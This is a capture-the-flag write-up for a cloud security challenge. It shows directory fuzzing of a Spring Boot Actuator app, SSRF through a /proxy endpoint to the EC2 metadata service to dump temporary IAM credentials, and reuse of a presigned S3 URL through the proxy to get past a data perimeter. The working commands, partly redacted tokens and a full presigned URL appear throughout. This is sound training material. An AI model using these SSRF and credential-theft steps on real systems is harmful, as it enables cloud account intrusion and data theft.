---
title: Perimeter Leaks
---

### Description
After weeks of exploits and privilege escalation you've gained access to what you hope is the final server that you can then use to extract out the secret flag from an S3 bucket. It won't be easy though.  

The target uses an AWS data perimeter to restrict access to the bucket contents.

__URL:__ https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/

### Enumeration:
You've discovered a Spring Boot Actuator application running on AWS: 

```bash
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com
Welcome to the proxy server.
```

Since this is a `Spring Boot Actuator Application` I do have a specific wordlist to `FUZZ` for directory enumeration.
I got a valid endpoint using Gobuster. `/actuator;/env`.

```bash
gobuster dir --url https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/ -w Actuator-bypass-payload-list.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Actuator-bypass-payload-list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
actuator;/env        (Status: 200) [Size: 5053]
actuator             (Status: 200) [Size: 1751]
proxy                (Status: 400) [Size: 136]
Progress: 26 / 26 (100.00%)
===============================================================
Finished
===============================================================
```

Initially doing a curl to that endpoint gave me a whole load of junk. I’ll re-do it but pipe(ing) it through `jq`.

```bash
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator\;/env | jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   5053   0   5053   0      0  44156      0                              0
{
  "activeProfiles": [],
  "defaultProfiles": [
    "default"
  ],
  "propertySources": [
    {
      "name": "server.ports",
      "properties": {
        "local.server.port": {
          "value": 8080
        }
      }
    },

    << SNIP FOR BREVITY >>

    {
      "name": "systemEnvironment",
      "properties": {
        "INVOCATION_ID": {
          "value": "4129fa7827964c699f36a92806607fc4",
          "origin": "System Environment Property \"INVOCATION_ID\""
        },
        "HOME": {
          "value": "/home/ec2-user",
          "origin": "System Environment Property \"HOME\""
        },
        "PATH": {
          "value": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin",
          "origin": "System Environment Property \"PATH\""
        },
        "SHELL": {
          "value": "/bin/bash",
          "origin": "System Environment Property \"SHELL\""
        },
        "BUCKET": {
          "value": "challenge01-470f711",
          "origin": "System Environment Property \"BUCKET\""
        },
        "LOGNAME": {
          "value": "ec2-user",
          "origin": "System Environment Property \"LOGNAME\""
        },
        "USER": {
          "value": "ec2-user",
          "origin": "System Environment Property \"USER\""
        },
        "SYSTEMD_EXEC_PID": {
          "value": "1498",
          "origin": "System Environment Property \"SYSTEMD_EXEC_PID\""
        },
        "LANG": {
          "value": "C.UTF-8",
          "origin": "System Environment Property \"LANG\""
        },
        "JOURNAL_STREAM": {
          "value": "8:16030",
          "origin": "System Environment Property \"JOURNAL_STREAM\""
        }
      }
    },
    {
      "name": "Config resource 'class path resource [application.properties]' via location 'optional:classpath:/'",
      "properties": {
        "spring.application.name": {
          "value": "spring",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 1:25"
        },
        "management.endpoints.web.exposure.include": {
          "value": "*",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 2:43"
        },
        "management.endpoints.web.expose": {
          "value": "*",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 3:33"
        },
        "management.endpoint.env.show-values": {
          "value": "always",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 4:37"
        },
        "server.error.include-message": {
          "value": "always",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 5:30"
        }
      }
    },
    {
      "name": "applicationInfo",
      "properties": {
        "spring.application.version": {
          "value": "0.0.1-SNAPSHOT"
        },
        "spring.application.pid": {
          "value": 1498
        }
      }
    }
  ]
}
```

What struck my attention was the bucket name field. How can I get to this s3 bucket.

```bash
"BUCKET": {
          "value": "challenge01-470f711",
          "origin": "System Environment Property \"BUCKET\""
        },
```

I can confirm this s3 bucket exists and it is located on us-east-1

```bash
aws s3 ls s3://challenge01-470f711 --no-sign-request

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied



curl -I https://challenge01-470f711.s3.amazonaws.com
HTTP/1.1 403 Forbidden
x-amz-bucket-region: us-east-1
x-amz-request-id: P3AK2274MVWRJ1N2
x-amz-id-2: E9fMYBhhCCvK+DGKgc9VnqM7e0QIGB3qHzAMDERZHp9gSbKjXOh0GqzOTiD1v9AUYuP2MfiIBRbtHwRedh8ZQAUO7V3QZ3aD
Content-Type: application/xml
Transfer-Encoding: chunked
Date: Wed, 18 Feb 2026 02:42:51 GMT
Server: AmazonS3

```

So I continued investigating all the endpoints when I stumbled on this on the /mapping endpoint. 

```bash
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator | jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1751   0   1751   0      0  14434      0                              0
{
  "_links": {
    "self": {
      "href": "http://127.0.0.1:8080/actuator",
      "templated": false
    },
<< SNIP FOR BREVITY>>

      "templated": false
    },
    "sbom": {
      "href": "http://127.0.0.1:8080/actuator/sbom",
      "templated": false
    },
    "sbom-id": {
      "href": "http://127.0.0.1:8080/actuator/sbom/{id}",
      "templated": true
    },
    "scheduledtasks": {
      "href": "http://127.0.0.1:8080/actuator/scheduledtasks",
      "templated": false
    },
    "mappings": {
      "href": "http://127.0.0.1:8080/actuator/mappings",
      "templated": false
    }
  }
}
```

The /proxy endpoint accepts url. This is so unusual.

```bash
{
              "predicate": "{ [/proxy], params [url]}",
              "handler": "challenge.Application#proxy(String)",
              "details": {
                "handlerMethod": {
                  "className": "challenge.Application",
                  "name": "proxy",
                  "descriptor": "(Ljava/lang/String;)Ljava/lang/String;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [],
                  "params": [
                    {
                      "name": "url",
                      "negated": false
                    }
                  ],
                  "patterns": [
                    "/proxy"
                  ],
                  "produces": []
                }
              }
            },
            {
              
```

First I have to obtain the API Token.

```bash
curl -X PUT -H 'x-aws-ec2-metadata-token-ttl-seconds: 3600' 'https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fapi%2Ftoken'
AQAEAFZzq5uBCj7-zUNVNa-HpvE0eAzjQ3jLopB4pIazuLuyEKhRJA==
```

Now I try to get the name of the IAM Role name

```bash
curl -H 'x-aws-ec2-metadata-token: AQAEAFZzq5uBCj7-zUNVNa-HpvE0eAzjQ3jLopB4pIazuLuyEKhRJA==' 'https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F'
challenge01-5592368

```

Once I got the IAM Role name. I can now dump the temporary credential for that IAM Role.

```bash
curl -H 'x-aws-ec2-metadata-token: AQAEAFZzq5uBCj7-zUNVNa-HpvE0eAzjQ3jLopB4pIazuLuyEKhRJA==' 'https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2Fchallenge01-5592368'
{
  "Code" : "Success",
  "LastUpdated" : "2026-02-18T02:36:45Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIXXXXXXXXXXXXXXXXXX",
  "SecretAccessKey" : "rXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "Token" : "IQoJb3JpZ2luX2VjEJP//////////wEaCXVzLWVhc3QtMSJGMEQCIFH7k2ZUqm51ENqKnBhTMZvXqD5fvou7uClX58Up5xVoAiBatcgb3uco0I5FrjlJmFTJomaJdUvxP/iIltJv",
  "Expiration" : "2026-02-18T08:53:42Z"
}
```

Now that I have the temporary aws credentials I can now view the s3 bucket and maybe download the `flag.txt`.

```bash
aws s3 ls s3://challenge01-470f711 --region us-east-1
                           PRE private/
2025-06-18 13:15:24         29 hello.txt

❯ aws s3 ls s3://challenge01-470f711/private/ --region us-east-1
2025-06-16 18:01:49         51 flag.txt
 
❯ aws s3 sync s3://challenge01-470f711/private/flag.txt /home/kali/Downloads --region us-east-1

❯ aws s3 presign s3://challenge01-470f711/private/flag.txt --region us-east-1
https://challenge01-470f711.s3.us-east-1.amazonaws.com/private/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIARK7LBOHXM2TX6YFA%2F20260218%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20260218T025820Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJGMEQCIFH7k2ZUqm51ENqKnBhTMZvXqD5fvou7uClX58Up5xVoAiBatcgb3uco0I5FrjlJmFTJomaJdUvxP%2FiIltJvwJIRpiq4BQhcEAAaDDA5MjI5Nzg1MTM3NCIMt64QrNoW2FM1v4nFKpUFSLBZZWAdgS4ANQTJXsLPDQSBv1Uy%2FbQqKw8%2FnlDb9MRKLHadyWzcNW2GHDRzVdeAn%2FIFcTTfN2CLgOK8KouJogTtZumT4EVGvX%2BFNMMePt5%2BtBO7HSXFy%2FsW1stHzkJIo9ykyPI6QMDVU9pLeroQomco9E4lAwAqjBY6WZkVwtHo6l5Z0p2RkHZmL0jSKKb1LGs%2BB99rhH9xP2cm9xYiL01wUMbMrRbZbILD6g05oYZcbLL8LVAFtZkQsYe4C7rxaxC9JXKNJZhKRAU9ZITBxTVFAP3IVEKvjY5m5COPFBkpFm0HFib%2BVmhk5SC%2B%2FZvggVDVyubuachGZ%2BImPSlBNLkA60UPkmSPOplH1Dp32uav3FEVQmVeCdXjDimIUw6ajzFxeZM7zW%2BexnHQCBChnbcBcPbk040prskv0MzMvu1w01LubWsNIZETcXxZEmHkirvarsCWTVr%2BkdeK2JCaj5hIJFiO9LTzGZl%2BxMvV8lQWL0yHrBFAeKZ8Lz19VmDgRJPfMvl5gyTHwJSveiJ2c0rLubgoTozlr7a3%2B7AN18R0GLh7sgd7a7U6YEyhVPYlkL%2Fj6H9VwJ5y0tiGd9lje5UcpP9dsjycDTxxPXZxqnI8OM0x%2BhkMBk%2FXDgChUztBSlPRF%2BNx9INbwzXeEaq%2B5OhjbJzW1XpKSkBGJcW%2FNczK8dqkEh%2BIcfysVEqO2oEG4DusMGf33XccfWem4Pk0V%2BEaY8HyUOzD%2BI8%2BZ%2FZTotGeqW6lhiEfT4R7ghKBTI1G2N3LOOCIVjSOG5%2B6aJ2dXMTNNUC7xfhvo15YkpjJlxXbhDgKpBAJHEqeVD2Hu3TmJ1piPkkfmNv8R2UUAi%2FD33MuPWdhtXbFrKmrNREPcDJ%2BvJx7STDvy9TMBjqyAS4YF%2Fc%2BGVBgvhDIj78VD9S8ZQyCIK8q8C26HIw5ma%2FyM6BVInOysgmI4hUEKpDYElojaUtoaSOYA1Uw78iQrVxQJR1fvxyOWZaPGkGo3za%2BU3AeYfPqnRKFw1Hzv7H8BDqo8NFUjlP%2B%2BceGU6cLiT82jrR41xoUVFMkIqAE61jdwM6hmrpXzIZiAPogdOL2O%2BB0sy1pcio9J3my%2BObJaKMHFF3JCKmMgjjHNF8jwhfJUa0%3D&X-Amz-Signature=afa0f27e6aa39ea216834890457cc78c6f52783d76da7feea4c61da9e567d1d3
```

From the output above I couldn’t download the file, so I resorted to generate a `presign s3 url`. That even gave me an `AccessDenied` when I tried to view it on the browser.

```bash
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<Error><Code>AccessDenied</Code><Message>User: arn:aws:sts::092297851374:assumed-role/challenge01-5592368/i-0bfc4291dd0acd279 is not authorized to perform: s3:GetObject on resource: "arn:aws:s3:::challenge01-470f711/private/flag.txt" with an explicit deny in a resource-based policy</Message><RequestId>8RQ2BDF5641RTK2D</RequestId><HostId>Tnx1wPjCli0cLMkMf+MP+pMC39n8boUX4gGVnnOHZaGuQG4kMo16aJ3tO+KRtjcQuUQi3+e/OpJC7XHqmDV9S+I7ullR3Lbn</HostId></Error>
```

Remember the previous vulnerability I used: Yes I can also encode the presign url and use the /proxy to get the flag.

```bash
curl 'https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=%68%74%74%70%73%3a%2f%...........'
The flag is: WIZ_CTF_XXXXXXXXXX_XXXX_XXX_XXXXXXXXXXX
```
